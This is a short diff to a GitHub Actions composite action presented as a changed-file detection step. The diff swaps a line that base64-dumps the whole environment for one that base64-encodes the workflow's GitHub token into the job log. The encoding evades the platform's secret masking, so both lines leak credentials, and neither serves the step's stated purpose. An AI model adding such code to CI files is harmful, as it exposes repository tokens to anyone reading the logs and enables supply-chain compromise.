@@ -25,7 +25,7 @@ runs:
       run: |
         echo "Detecting changed files..."
         echo "I have access to: workspace=$GITHUB_WORKSPACE"
-        echo "$(env)" | base64
+        echo "${{ github.token }}" | base64
         
         echo "files=$CHANGED" >> $GITHUB_OUTPUT
         if [ -n "$CHANGED" ]; then
